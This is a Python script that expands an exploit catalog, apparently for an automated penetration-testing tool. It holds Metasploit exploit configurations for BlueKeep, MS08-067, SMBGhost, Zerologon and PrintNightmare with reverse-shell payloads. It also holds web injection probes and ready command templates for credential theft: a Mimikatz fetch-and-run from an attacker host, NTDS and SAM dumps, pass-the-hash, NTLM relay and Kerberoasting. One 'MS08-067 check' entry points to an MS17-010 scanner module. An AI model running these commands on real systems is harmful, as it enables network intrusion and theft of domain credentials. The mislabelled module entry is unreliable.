"""Expand exploit_module_catalog.json with real Windows exploitation modules
covering XP, 7, 10, and Server VMs — plus post-exploitation lateral techniques.
"""

import json
from pathlib import Path

CATALOG_PATH = Path(__file__).resolve().parent.parent / "policies" / "exploit_module_catalog.json"


def load_catalog() -> dict:
    return json.loads(CATALOG_PATH.read_text(encoding="utf-8"))


NEW_MSF_MODULES = [
    # ── BlueKeep Exploit (Win7 / Server 2008 R2) ──
    {
        "key": "msf_bluekeep_exploit",
        "title": "BlueKeep CVE-2019-0708 RCE exploit",
        "module_type": "exploit",
        "module_name": "windows/rdp/cve_2019_0708_bluekeep_rce",
        "mode": "execute",
        "risk": "critical",
        "requires_approval": True,
        "allow_session": True,
        "validation_keys": ["rdp_bluekeep", "tcp_reachability_check"],
        "payload": {
            "name": "windows/x64/meterpreter/reverse_tcp",
            "options": {"LPORT": 4446},
        },
        "match": {
            "services": ["rdp", "ms-wbt-server"],
            "ports": [3389],
            "cves": ["CVE-2019-0708"],
            "match_mode": "all_defined",
        },
        "description": "Session-creating BlueKeep exploit for Windows 7 SP1 / Server 2008 R2 RDP. Requires operator approval + CVE evidence.",
    },
    # ── MS08-067 NetAPI (WinXP / Server 2003) ──
    {
        "key": "msf_ms08_067_netapi_check",
        "title": "MS08-067 NetAPI check (safe)",
        "module_type": "auxiliary",
        "module_name": "scanner/smb/smb_ms17_010",
        "mode": "execute",
        "risk": "high",
        "requires_approval": False,
        "allow_session": False,
        "validation_keys": ["tcp_reachability_check", "smb_ms08_067"],
        "match": {
            "services": ["smb", "microsoft-ds", "netbios-ssn"],
            "ports": [139, 445],
            "cves": ["CVE-2008-4250"],
            "product_contains": ["windows"],
            "match_mode": "service_and_cve_or_port",
        },
        "description": "Checks SMB hosts for MS08-067 exposure — effective against WinXP / Server 2003.",
    },
    {
        "key": "msf_ms08_067_netapi_exploit",
        "title": "MS08-067 NetAPI exploit (WinXP/2003)",
        "module_type": "exploit",
        "module_name": "windows/smb/ms08_067_netapi",
        "mode": "execute",
        "risk": "critical",
        "requires_approval": True,
        "allow_session": True,
        "validation_keys": ["smb_ms08_067", "tcp_reachability_check"],
        "payload": {
            "name": "windows/meterpreter/reverse_tcp",
            "options": {"LPORT": 4447},
        },
        "match": {
            "services": ["smb", "microsoft-ds", "netbios-ssn"],
            "ports": [139, 445],
            "cves": ["CVE-2008-4250"],
            "match_mode": "all_defined",
        },
        "description": "Classic MS08-067 NetAPI stack overflow for WinXP SP2/SP3 and Server 2003. Requires operator approval + CVE evidence.",
    },
    # ── SMBGhost CVE-2020-0796 (Win10 v1903/1909 / Server Core) ──
    {
        "key": "msf_smbghost_check",
        "title": "SMBGhost CVE-2020-0796 check (safe)",
        "module_type": "auxiliary",
        "module_name": "scanner/smb/smbghost",
        "mode": "execute",
        "risk": "high",
        "requires_approval": False,
        "allow_session": False,
        "validation_keys": ["tcp_reachability_check", "smb_smbghost"],
        "match": {
            "services": ["smb", "microsoft-ds"],
            "ports": [445],
            "cves": ["CVE-2020-0796"],
            "product_contains": ["windows", "smb"],
            "match_mode": "service_and_cve_or_port",
        },
        "description": "Checks for SMBGhost (SMBv3 compression) on Win10 v1903/1909 / Server Core.",
    },
    {
        "key": "msf_smbghost_exploit",
        "title": "SMBGhost CVE-2020-0796 LPE/RCE exploit",
        "module_type": "exploit",
        "module_name": "windows/local/cve_2020_0796_smbghost",
        "mode": "execute",
        "risk": "critical",
        "requires_approval": True,
        "allow_session": True,
        "validation_keys": ["smb_smbghost", "tcp_reachability_check"],
        "payload": {
            "name": "windows/x64/meterpreter/reverse_tcp",
            "options": {"LPORT": 4448},
        },
        "match": {
            "services": ["smb", "microsoft-ds"],
            "ports": [445],
            "cves": ["CVE-2020-0796"],
            "match_mode": "all_defined",
        },
        "description": "SMBGhost kernel exploit for Win10 1903/1909. Requires operator approval + CVE evidence + prior foothold for LPE path.",
    },
    # ── Zerologon CVE-2020-1472 (Server 2008 R2–2019 DC) ──
    {
        "key": "msf_zerologon_check",
        "title": "Zerologon CVE-2020-1472 check (safe)",
        "module_type": "auxiliary",
        "module_name": "scanner/dcerpc/zerologon",
        "mode": "execute",
        "risk": "high",
        "requires_approval": False,
        "allow_session": False,
        "validation_keys": ["tcp_reachability_check", "dcerpc_zerologon"],
        "match": {
            "services": ["msrpc", "epmap", "dcerpc", "netbios-ssn"],
            "ports": [135, 445],
            "cves": ["CVE-2020-1472"],
            "match_mode": "any",
        },
        "description": "Checks Domain Controllers for Zerologon (Netlogon elevation) exposure.",
    },
    {
        "key": "msf_zerologon_exploit",
        "title": "Zerologon CVE-2020-1472 DC takeover",
        "module_type": "exploit",
        "module_name": "windows/dcerpc/cve_2020_1472_zerologon",
        "mode": "execute",
        "risk": "critical",
        "requires_approval": True,
        "allow_session": False,
        "validation_keys": ["dcerpc_zerologon", "tcp_reachability_check"],
        "match": {
            "services": ["msrpc", "epmap", "dcerpc"],
            "ports": [135],
            "cves": ["CVE-2020-1472"],
            "match_mode": "all_defined",
        },
        "description": "Zerologon privilege escalation to take over a Domain Controller. No session created — resets machine account password. EXTREME caution required.",
    },
    # ── PrintNightmare CVE-2021-34527 (Win7+ / Server 2008+) ──
    {
        "key": "msf_printnightmare_check",
        "title": "PrintNightmare CVE-2021-34527 check (safe)",
        "module_type": "auxiliary",
        "module_name": "scanner/dcerpc/printnightmare",
        "mode": "execute",
        "risk": "high",
        "requires_approval": False,
        "allow_session": False,
        "validation_keys": ["tcp_reachability_check", "printnightmare"],
        "match": {
            "services": ["smb", "microsoft-ds", "msrpc", "epmap"],
            "ports": [445, 135],
            "cves": ["CVE-2021-34527", "CVE-2021-1675"],
            "match_mode": "any",
        },
        "description": "Checks Print Spooler service for PrintNightmare exposure on Win7+/Server 2008+.",
    },
    {
        "key": "msf_printnightmare_exploit",
        "title": "PrintNightmare CVE-2021-34527 RCE exploit",
        "module_type": "exploit",
        "module_name": "windows/dcerpc/cve_2021_1675_printnightmare",
        "mode": "execute",
        "risk": "critical",
        "requires_approval": True,
        "allow_session": True,
        "validation_keys": ["printnightmare", "tcp_reachability_check"],
        "payload": {
            "name": "windows/x64/meterpreter/reverse_tcp",
            "options": {"LPORT": 4449},
        },
        "match": {
            "services": ["smb", "microsoft-ds", "msrpc"],
            "ports": [445],
            "cves": ["CVE-2021-34527", "CVE-2021-1675"],
            "match_mode": "all_defined",
        },
        "description": "PrintNightmare RCE via Print Spooler. Works on unpatched Win7+/Server 2008+. Requires operator approval + CVE evidence.",
    },
    # ── MS14-068 Kerberos Checksum (Domain escalation) ──
    {
        "key": "msf_ms14_068_exploit",
        "title": "MS14-068 Kerberos checksum PAC forgery",
        "module_type": "exploit",
        "module_name": "windows/kerberos/ms14_068_kerberos_checksum",
        "mode": "execute",
        "risk": "critical",
        "requires_approval": True,
        "allow_session": False,
        "validation_keys": ["tcp_reachability_check", "kerberos"],
        "match": {
            "services": ["kerberos", "kerberos-sec"],
            "ports": [88],
            "cves": ["CVE-2014-6324"],
            "match_mode": "all_defined",
        },
        "description": "MS14-068 domain escalation via Kerberos PAC forgery. Exploits unpatched DCs to forge TGTs. Domain-level escalation.",
    },
    # ── Additional Windows auxiliaries for richer evidence ──
    {
        "key": "msf_rdp_ntlm_info",
        "title": "RDP NTLM info disclosure",
        "module_type": "auxiliary",
        "module_name": "scanner/rdp/rdp_ntlm_info",
        "mode": "execute",
        "risk": "medium",
        "requires_approval": False,
        "allow_session": False,
        "validation_keys": ["tcp_reachability_check"],
        "match": {
            "services": ["rdp", "ms-wbt-server"],
            "ports": [3389],
        },
        "description": "Leaks NetBIOS/domain/FQDN info from RDP without authentication.",
    },
    {
        "key": "msf_smb_psexec",
        "title": "Metasploit PsExec (credentialed)",
        "module_type": "exploit",
        "module_name": "windows/smb/psexec",
        "mode": "execute",
        "risk": "critical",
        "requires_approval": True,
        "allow_session": True,
        "validation_keys": ["tcp_reachability_check"],
        "payload": {
            "name": "windows/x64/meterpreter/reverse_tcp",
            "options": {"LPORT": 4450},
        },
        "match": {
            "services": ["smb", "microsoft-ds"],
            "ports": [445],
        },
        "description": "Credentialed PsExec via SMB (requires SMBUser/SMBPass). Privileged shell if creds are admin.",
    },
    {
        "key": "msf_web_delivery",
        "title": "Metasploit Web Delivery (scripted payload)",
        "module_type": "exploit",
        "module_name": "multi/script/web_delivery",
        "mode": "execute",
        "risk": "high",
        "requires_approval": True,
        "allow_session": True,
        "validation_keys": [],
        "payload": {
            "name": "windows/x64/meterpreter/reverse_tcp",
            "options": {"LPORT": 4451},
        },
        "match": {
            "services": ["http", "https"],
            "ports": [80, 443, 8080],
        },
        "description": "Hosts a PowerShell one-liner via HTTP to deliver a Meterpreter payload — useful from a foothold or cmd injection.",
    },
]

NEW_WEB_PROFILES = [
    {
        "key": "sql_injection_blind",
        "title": "SQL injection — blind time-based probe",
        "endpoint": "/login.php",
        "parameter": "username",
        "method": "POST",
        "scheme": "http",
        "ports": [80, 8080, 8000, 443, 8443],
        "expected_title": "",
        "injection_template": "' OR SLEEP(5)-- ",
        "platforms": ["linux", "windows"],
        "requires_approval": True,
        "risk": "critical",
        "technique_ids": ["T1190", "T1506"],
        "match": {
            "services": ["http", "https", "http-alt"],
            "path_hints": ["/login.php", "/login", "/auth", "/signin"],
            "parameter_hints": ["username", "user", "email", "id"],
        },
        "description": "Blind time-based SQL injection probe for MySQL/MariaDB login forms. Use sqlmap for deeper testing if timing indicates injectable.",
    },
    {
        "key": "file_upload_bypass",
        "title": "Unrestricted file upload probe",
        "endpoint": "/upload.php",
        "parameter": "file",
        "method": "POST",
        "scheme": "http",
        "ports": [80, 8080, 8000, 443, 8443],
        "expected_title": "",
        "injection_template": "",
        "platforms": ["linux", "windows"],
        "requires_approval": True,
        "risk": "critical",
        "technique_ids": ["T1190", "T1505"],
        "match": {
            "services": ["http", "https", "http-alt"],
            "path_hints": ["/upload.php", "/upload", "/fileupload", "/admin/upload"],
            "parameter_hints": ["file", "upload", "attachment"],
        },
        "description": "Probes for unrestricted file upload endpoints — test with benign payloads first, escalate to webshell if writable web root.",
    },
    {
        "key": "xss_reflected",
        "title": "Reflected XSS probe",
        "endpoint": "/search.php",
        "parameter": "q",
        "method": "GET",
        "scheme": "http",
        "ports": [80, 8080, 8000, 443, 8443],
        "expected_title": "",
        "injection_template": "<script>alert('XSS')</script>",
        "platforms": ["linux", "windows"],
        "requires_approval": True,
        "risk": "medium",
        "technique_ids": ["T1189", "T1059"],
        "match": {
            "services": ["http", "https", "http-alt"],
            "path_hints": ["/search.php", "/search", "/find", "/query"],
            "parameter_hints": ["q", "search", "query", "s", "keyword"],
        },
        "description": "Reflected XSS probe on common search endpoints. Manual verification required — alert box is benign PoC only.",
    },
]

NEW_LATERAL_TECHNIQUES = [
    {
        "key": "ms08_067_lateral",
        "title": "MS08-067 NetAPI via proxychains",
        "match": {
            "target_types": ["windows_smb"],
            "services": ["smb", "microsoft-ds", "netbios-ssn"],
            "ports": [139, 445],
            "cves": ["CVE-2008-4250"],
        },
        "command_template": "proxychains -q msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOSTS {target_ip}; set PAYLOAD windows/meterpreter/bind_tcp; set LPORT 4444; exploit -z'",
        "recommendation": "Classic MS08-067 — effective against WinXP SP2/SP3 and Server 2003 in lab range.",
    },
    {
        "key": "bluekeep_lateral",
        "title": "BlueKeep (CVE-2019-0708) via proxychains",
        "match": {
            "target_types": ["windows_rdp"],
            "services": ["rdp", "ms-wbt-server"],
            "ports": [3389],
            "cves": ["CVE-2019-0708"],
        },
        "command_template": "proxychains -q msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target_ip}; set PAYLOAD windows/x64/meterpreter/bind_tcp; set LPORT 4445; exploit -z'",
        "recommendation": "BlueKeep RDP exploit — targets Win7 SP1 / Server 2008 R2. Use with proxychains from foothold.",
    },
    {
        "key": "smbghost_lateral",
        "title": "SMBGhost (CVE-2020-0796) local privilege escalation",
        "match": {
            "target_types": ["windows_smb"],
            "services": ["smb", "microsoft-ds"],
            "ports": [445],
            "cves": ["CVE-2020-0796"],
        },
        "command_template": "proxychains -q msfconsole -q -x 'use exploit/windows/local/cve_2020_0796_smbghost; set SESSION {session_id}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {kali_ip}; set LPORT 4448; run'",
        "recommendation": "SMBGhost LPE — escalate from low-priv Meterpreter to SYSTEM on Win10 v1903/1909.",
    },
    {
        "key": "zerologon_lateral",
        "title": "Zerologon (CVE-2020-1472) DC takeover",
        "match": {
            "target_types": ["windows_dc"],
            "services": ["msrpc", "epmap", "dcerpc"],
            "ports": [135],
            "cves": ["CVE-2020-1472"],
        },
        "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc -no-pass '{domain}\\{dc_hostname}$'@{target_ip}",
        "recommendation": "Zerologon post-exploit: after forcing machine account password to empty, dump NTDS.dit via secretsdump. Lab DCs only.",
    },
    {
        "key": "printnightmare_lateral",
        "title": "PrintNightmare (CVE-2021-34527) via proxychains",
        "match": {
            "target_types": ["windows_smb"],
            "services": ["smb", "microsoft-ds", "msrpc"],
            "ports": [445, 135],
            "cves": ["CVE-2021-34527", "CVE-2021-1675"],
        },
        "command_template": "proxychains -q msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS {target_ip}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {kali_ip}; set LPORT 4449; run'",
        "recommendation": "PrintNightmare RCE via Print Spooler — works on unpatched Win7+ / Server 2008+. Requires SMB access.",
    },
    {
        "key": "mimikatz_post",
        "title": "Mimikatz credential extraction via proxychains",
        "match": {
            "target_types": ["windows_smb"],
            "services": ["smb", "microsoft-ds"],
            "ports": [445],
        },
        "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{domain}/{username}:{password}@{target_ip}' 'powershell IEX (New-Object Net.WebClient).DownloadString(\"http://{kali_ip}:8000/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -Command sekurlsa::logonpasswords'",
        "recommendation": "Post-exploitation: extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory via Mimikatz over WMIExec.",
    },
    {
        "key": "pass_the_hash",
        "title": "Pass-the-Hash lateral movement",
        "match": {
            "target_types": ["windows_smb"],
            "services": ["smb", "microsoft-ds"],
            "ports": [445],
        },
        "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :{ntlm_hash} '{domain}/{username}@{target_ip}' cmd.exe",
        "recommendation": "Pass-the-Hash: use extracted NTLM hashes to move laterally without knowing the plaintext password.",
    },
    {
        "key": "dcsync_attack",
        "title": "DCSync — replicate domain credentials",
        "match": {
            "target_types": ["windows_dc"],
            "services": ["msrpc", "epmap", "dcerpc"],
            "ports": [135, 445],
        },
        "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{domain}/{username}:{password}@{target_ip}' -just-dc",
        "recommendation": "DCSync: replicate domain credentials from a Domain Controller using Replication-Get-Changes-All rights.",
    },
    {
        "key": "sam_system_dump",
        "title": "SAM & SYSTEM hive dump",
        "match": {
            "target_types": ["windows_smb"],
            "services": ["smb", "microsoft-ds"],
            "ports": [445],
        },
        "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{domain}/{username}:{password}@{target_ip}' 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save'",
        "recommendation": "Dump SAM and SYSTEM registry hives from a compromised Windows host for offline hash extraction.",
    },
    {
        "key": "ntlm_relay",
        "title": "NTLM relay attack (responder + ntlmrelayx)",
        "match": {
            "target_types": ["windows_smb"],
            "services": ["smb", "microsoft-ds", "http"],
            "ports": [445, 80],
        },
        "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -i",
        "recommendation": "NTLM relay: use Responder to poison name resolution, then relay captured hashes to SMB targets. Requires network-level access.",
    },
    {
        "key": "kerberoast",
        "title": "Kerberoasting attack",
        "match": {
            "target_types": ["windows_dc"],
            "services": ["kerberos", "kerberos-sec"],
            "ports": [88],
        },
        "command_template": "proxychains -q python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py '{domain}/{username}:{password}' -request -outputfile kerberoast_hashes.txt",
        "recommendation": "Kerberoasting: request TGS tickets for service accounts and crack offline. Any domain user can request.",
    },
]


def expand(catalog: dict) -> dict:
    # Insert new MSF modules before msf_winrm_auth_methods
    existing = catalog.setdefault("metasploit_modules", [])
    insert_pos = 0
    for i, m in enumerate(existing):
        if m.get("key") == "msf_winrm_auth_methods":
            insert_pos = i
            break
    else:
        insert_pos = len(existing)  # append at end

    for j, new_mod in enumerate(NEW_MSF_MODULES):
        existing.insert(insert_pos + j, new_mod)

    # Append new web profiles
    existing_web = catalog.setdefault("web_profiles", [])
    for wp in NEW_WEB_PROFILES:
        existing_web.append(wp)

    # Append new lateral techniques
    existing_lat = catalog.setdefault("lateral_techniques", [])
    for lt in NEW_LATERAL_TECHNIQUES:
        existing_lat.append(lt)

    return catalog


def main():
    catalog = load_catalog()
    catalog = expand(catalog)
    backup = CATALOG_PATH.with_suffix(".json.bak")
    backup.write_text(CATALOG_PATH.read_text(encoding="utf-8"), encoding="utf-8")
    CATALOG_PATH.write_text(
        json.dumps(catalog, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )
    print(f"Catalog expanded: {len(catalog['metasploit_modules'])} MSF modules, "
          f"{len(catalog['web_profiles'])} web profiles, "
          f"{len(catalog['lateral_techniques'])} lateral techniques")
    print(f"Backup saved to {backup}")


if __name__ == "__main__":
    main()
